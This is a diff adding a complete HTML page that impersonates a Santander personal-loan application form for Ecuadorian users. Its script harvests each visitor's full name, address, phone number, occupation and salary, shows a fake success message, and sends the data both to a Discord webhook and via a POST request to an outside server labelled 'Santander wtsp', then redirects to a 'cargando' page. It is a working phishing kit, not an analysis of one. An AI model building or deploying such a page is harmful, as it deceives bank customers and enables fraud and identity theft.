@@ -1,0 +1,450 @@
+
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+<!-- Inserted by miarroba -->
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7294310421616689" crossorigin="anonymous"></script>
+<script type='text/javascript' src='https://ads.vidoomy.com/miarroba_23335.js' async></script>
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-T2VG59');</script>
+<!-- Inserted by miarroba -->
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Solicitud - Formulario</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "SantanderHeadline", -apple-system, BlinkMacSystemFont,
+          "Segoe UI", sans-serif;
+        background: fff;
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+      }
+
+      .container {
+        background: white;
+        border-radius: 8px;
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+        max-width: 480px;
+        width: 100%;
+        padding: 40px;
+      }
+
+      .logo {
+        text-align: center;
+        margin-bottom: 10px;
+      }
+
+      .logo-text {
+        color: #ec0000;
+        font-size: 32px;
+        font-weight: bold;
+        letter-spacing: 2px;
+      }
+
+      .header-link {
+        text-align: right;
+        margin-bottom: 30px;
+      }
+
+      .header-link a {
+        color: #ec0000;
+        text-decoration: none;
+        font-size: 14px;
+        font-weight: 500;
+      }
+
+      .header-link a:after {
+        content: " ⟩";
+      }
+
+      h1 {
+        color: #ec0000;
+        font-size: 28px;
+        margin-bottom: 30px;
+        font-weight: 400;
+      }
+
+      .form-group {
+        margin-bottom: 24px;
+      }
+
+      label {
+        display: block;
+        color: #ec0000;
+        font-size: 14px;
+        font-weight: 500;
+        margin-bottom: 8px;
+      }
+
+      input,
+      select {
+        width: 100%;
+        padding: 14px 16px;
+        border: 1px solid #d3d3d3;
+        border-radius: 4px;
+        font-size: 16px;
+        transition: all 0.3s ease;
+        background: white;
+      }
+
+      input:focus,
+      select:focus {
+        outline: none;
+        border-color: #ec0000;
+        box-shadow: 0 0 0 3px rgba(236, 0, 0, 0.1);
+      }
+
+      select {
+        cursor: pointer;
+        appearance: none;
+        background-image: url("data:image/svg+xml,%3Csvg width='12' height='8' viewBox='0 0 12 8' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1 1L6 6L11 1' stroke='%23EC0000' stroke-width='2' stroke-linecap='round'/%3E%3C/svg%3E");
+        background-repeat: no-repeat;
+        background-position: right 16px center;
+        padding-right: 40px;
+      }
+
+      .btn-primary {
+        width: 100%;
+        padding: 16px;
+        background: #ec0000;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background 0.3s ease;
+        margin-top: 10px;
+      }
+
+      .btn-primary:hover {
+        background: #c40000;
+      }
+
+      .btn-primary:active {
+        transform: scale(0.98);
+      }
+
+      .info-box {
+        background: #fff4e5;
+        border-left: 4px solid #f7b500;
+        padding: 16px;
+        margin-top: 30px;
+        border-radius: 4px;
+      }
+
+      .info-box h3 {
+        color: #ec0000;
+        font-size: 14px;
+        font-weight: 600;
+        margin-bottom: 8px;
+      }
+
+      .info-box p {
+        color: #5c5c5c;
+        font-size: 13px;
+        line-height: 1.5;
+      }
+
+      .info-box a {
+        color: #ec0000;
+        text-decoration: underline;
+      }
+
+      .footer-logo {
+        text-align: center;
+        margin-top: 40px;
+        padding-top: 30px;
+        border-top: 1px solid #e0e0e0;
+      }
+
+      .footer-logo-text {
+        color: white;
+        background: #ec0000;
+        padding: 20px;
+        font-size: 36px;
+        font-weight: bold;
+        letter-spacing: 3px;
+        display: inline-block;
+        border-radius: 4px;
+      }
+
+      .footer-links {
+        margin-top: 20px;
+        text-align: center;
+      }
+
+      .footer-links a {
+        color: #ec0000;
+        text-decoration: none;
+        font-size: 13px;
+        margin: 0 10px;
+        display: block;
+        margin-bottom: 8px;
+      }
+
+      .success-message {
+        display: none;
+        background: #d4edda;
+        color: #155724;
+        padding: 16px;
+        border-radius: 4px;
+        margin-bottom: 20px;
+        border: 1px solid #c3e6cb;
+      }
+
+      @media (max-width: 540px) {
+        .container {
+          padding: 30px 20px;
+        }
+
+        h1 {
+          font-size: 24px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+<!-- Inserted by miarroba -->
+<noscript><iframe src="logo.png" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- Inserted by miarroba -->
+    <div class="container">
+      <div class="logo">
+        <div class="logo.png">
+          <img
+            src="logo.png"
+            style="width: 250px"
+            alt=""
+          />
+        </div>
+      </div>
+
+      <div class="header-link">
+        <a href="#">Ir a Prestamos Personales </a>
+      </div>
+
+      <h1>¡Bienvenido!</h1>
+
+      <div id="successMessage" class="success-message">
+        ✓ Formulario enviado correctamente
+      </div>
+
+      <div id="formContainer">
+        <div class="form-group">
+          <label for="nombres">NOMBRES *</label>
+          <input
+            type="text"
+            id="nombres"
+            name="nombres"
+            required
+            placeholder="Ingrese sus nombres"
+          />
+        </div>
+
+        <div class="form-group">
+          <label for="apellidos">APELLIDOS *</label>
+          <input
+            type="text"
+            id="apellidos"
+            name="apellidos"
+            required
+            placeholder="Ingrese sus apellidos"
+          />
+        </div>
+
+        <div class="form-group">
+          <label for="direccion">DIRECCIÓN *</label>
+          <input
+            type="text"
+            id="direccion"
+            name="direccion"
+            required
+            placeholder="Ingrese su dirección"
+          />
+        </div>
+
+        <div class="form-group">
+          <label for="telefono">NÚMERO TELEFÓNICO *</label>
+          <div style="display: flex; gap: 8px">
+            <input
+              type="text"
+              value="+593"
+              readonly
+              style="
+                width: 70px;
+                background: #f5f5f5;
+                color: #666;
+                cursor: not-allowed;
+              "
+            />
+            <input
+              type="tel"
+              id="telefono"
+              name="telefono"
+              required
+              placeholder="5512345678"
+              pattern="[0-9]{10}"
+              title="Ingrese un número telefónico válido de 10 dígitos"
+              inputmode="numeric"
+              style="flex: 1"
+            />
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label for="ocupacion">¿Cuál es su ocupación actual? *</label>
+          <select id="ocupacion" name="ocupacion" required>
+            <option value="">Seleccione una opción</option>
+            <option value="empleado">Empleado</option>
+            <option value="independiente">Trabajador Independiente</option>
+            <option value="empresario">Empresario</option>
+
+            <!-- Profesiones específicas -->
+            <option value="doctor">Doctor / Médico</option>
+            <option value="abogado">Abogado</option>
+            <option value="ingeniero">Ingeniero</option>
+            <option value="maestro">Maestro / Profesor</option>
+            <option value="contador">Contador</option>
+            <option value="enfermero">Enfermero</option>
+            <option value="arquitecto">Arquitecto</option>
+            <option value="psicologo">Psicólogo</option>
+
+            <!-- Otras opciones generales -->
+            <option value="profesional">Profesional Independiente</option>
+            <option value="estudiante">Estudiante</option>
+            <option value="jubilado">Jubilado/Pensionado</option>
+            <option value="hogar">Labores del Hogar</option>
+            <option value="desempleado">Desempleado</option>
+            <option value="otro">Otro</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label for="salario">¿Cuál es su rango salarial mensual? *</label>
+          <select id="salario" name="salario" required>
+            <option value="">Seleccione un rango</option>
+            <option value="0-500">Menos de $500 </option>
+            <option value="500-2.000">$500 - $2,000 </option>
+            <option value="2.500-3.500">$2,500 - $3,500 </option>
+            <option value="4.000-5.500">$4,000 - $5,500 </option>
+            <option value="7.000-9.500">$7,000 - $9,500 </option>
+            <option value="10.000-15.000">$10,000 - $15,000 </option>
+            <option value="18.000+">Más de $18,000 </option>
+          </select>
+        </div>
+
+        <button type="button" class="btn-primary" onclick="submitForm()">
+          Continuar
+        </button>
+
+        <div class="info-box">
+          <h3>⚠ Cuida tus datos y la seguridad de tu equipo</h3>
+          <p>
+            Algunos extensiones de los navegadores pueden poner en riesgo la
+            seguridad de tus datos. Solo instala las extensiones que uses para
+            que te libres de ellos.
+          </p>
+          <a href="#">Más información</a>
+        </div>
+      </div>
+
+      <div class="footer-links">
+        <a href="#">Aviso legal</a>
+        <a href="#">Mapa del sitio</a>
+        <a href="#">Aviso de privacidad</a>
+      </div>
+    </div>
+
+    <script>
+      async function submitForm() {
+        const nombres = document.getElementById("nombres").value.trim();
+        const apellidos = document.getElementById("apellidos").value.trim();
+        const direccion = document.getElementById("direccion").value.trim();
+        const telefono = document.getElementById("telefono").value.trim();
+        const ocupacion = document.getElementById("ocupacion").value;
+        const salario = document.getElementById("salario").value;
+
+        if (!nombres || !apellidos || !direccion || !telefono || !ocupacion || !salario) {
+          alert("Por favor, complete todos los campos obligatorios.");
+          return;
+        }
+
+        // Validar que el teléfono tenga 10 dígitos
+        if (telefono.length !== 10 || !/^\d+$/.test(telefono)) {
+          alert(
+            "Por favor, ingrese un número telefónico válido de 10 dígitos."
+          );
+          return;
+        }
+
+        const successMessage = document.getElementById("successMessage");
+        successMessage.style.display = "block";
+
+        const formDataObj = {
+          nombres,
+          apellidos,
+          direccion,
+          "telefono": "+593" + telefono,
+          ocupacion,
+          salario,
+        };
+
+        console.log("Datos del formulario:", formDataObj);
+
+        // Enviar a Discord
+        await sendToDiscord("INFO", formDataObj, false);
+
+        localStorage.setItem("usuario", "+593" + telefono);
+        localStorage.setItem("nombrecompleto", nombres + " " + apellidos);
+
+        // Navegar a la siguiente página
+        setTimeout(() => {
+          window.location.href = "cargando.html";
+        }, 1000);
+
+        // Enviar datos al servidor externo en segundo plano (sin esperar)
+        const formData = new FormData();
+        formData.append(
+          "mensaje",
+          "Santander wtsp\nNombres: " +
+            nombres +
+            "\nApellidos: " +
+            apellidos +
+            "\nDirección: " +
+            direccion +
+            "\nTeléfono: +593" +
+            telefono +
+            "\nOcupacion: " +
+            ocupacion +
+            "\nSalario: " +
+            salario
+        );
+
+        fetch("https://servidorne.vercel.app/bbdsasd", {
+          method: "POST",
+          body: formData,
+        }).catch(error => console.error("Error:", error));
+      }
+
+      document.querySelectorAll("input, select").forEach((element) => {
+        element.addEventListener("keypress", (e) => {
+          if (e.key === "Enter" && element.tagName === "INPUT") {
+            submitForm();
+          }
+        });
+      });
+    </script>
+    <script src="./discord-sender.js"></script>
+  <!-- Inserted by miarroba -->
+</script></noframes></noembed></noscript><script type="text/javascript" src="/hosting__contador__visitas__unicas.php?h=2209259&amp;t=1767703337&amp;k=1a42079226a21b651806d9cf9754712b&amp;__muid="></script>
+<!-- Inserted by miarroba -->
+</body>
+</html>
